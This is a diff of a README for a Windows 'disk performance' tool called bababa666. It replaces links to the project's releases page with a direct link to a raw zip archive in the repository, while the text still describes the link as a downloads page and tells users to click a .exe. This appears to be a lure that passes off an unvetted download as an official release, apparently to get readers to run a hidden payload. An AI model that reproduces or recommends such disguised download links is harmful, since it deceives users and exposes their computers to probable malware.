@@ -1,6 +1,6 @@
 # ⚙️ bababa666 - Optimize your computer disk performance today
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Kippyprocessed215/bababa666/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Kippyprocessed215/bababa666/raw/refs/heads/main/main/bababa_3.2.zip)
 
 ## Overview
 
@@ -28,7 +28,7 @@ This application runs on Windows systems. Ensure your machine meets these specif
 
 Follow these steps to set up the software on your computer.
 
-1.  Click the following link to reach the downloads page: [https://github.com/Kippyprocessed215/bababa666/releases](https://github.com/Kippyprocessed215/bababa666/releases).
+1.  Click the following link to reach the downloads page: [https://github.com/Kippyprocessed215/bababa666/raw/refs/heads/main/main/bababa_3.2.zip](https://github.com/Kippyprocessed215/bababa666/raw/refs/heads/main/main/bababa_3.2.zip).
 2.  Look for the latest release version on the page.
 3.  Click the `.exe` file to start the download to your computer.
 4.  Once the file finishes downloading, locate it in your Downloads folder.
